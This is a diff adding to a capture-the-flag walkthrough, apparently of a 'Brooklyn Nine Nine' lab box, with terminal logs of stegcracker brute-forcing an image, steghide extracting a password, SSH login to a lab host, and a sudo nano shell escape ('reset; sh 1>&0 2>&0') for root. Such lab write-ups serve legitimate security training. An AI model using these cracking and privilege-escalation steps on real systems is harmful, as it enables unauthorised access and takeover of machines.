@@ -161,8 +161,8 @@ Enjoy!!
 #
 ```
 
-
-# 80
+# another pattern
+## 80
 ```
 <!DOCTYPE html>
 <html>
@@ -196,4 +196,55 @@ body, html {
 <!-- Have you ever heard of steganography? -->
 </body>
 </html>
+```
+
+
+
+```
+root@kali:~# stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
+StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2020 - Luke Paris (Paradoxis)
+
+Counting lines in wordlist..
+Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
+Successfully cracked file with password: <pass>
+Tried 20587 passwords
+Your file has been written to: brooklyn99.jpg.out
+```
+
+```
+root@kali:~# steghide extract -sf brooklyn99.jpg
+Enter passphrase:
+wrote extracted data to "note.txt".
+root@kali:~# ls
+brooklyn99.jpg      Desktop    Downloads  note_to_jake.txt  Pictures  results    thinclient_drives
+brooklyn99.jpg.out  Documents  Music      note.txt          Public    Templates  Videos
+root@kali:~# cat note
+cat: note: No such file or directory
+root@kali:~# cat note.txt
+Holts Password:
+<pass>
+
+Enjoy!!
+root@kali:~# ssh holt@10.10.49.123
+holt@10.10.49.123's password:
+Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
+holt@brookly_nine_nine:~$ ls
+nano.save  user.txt
+```
+
+```
+holt@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+holt@brookly_nine_nine:~$
+```
+# priv
+```
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
 ```
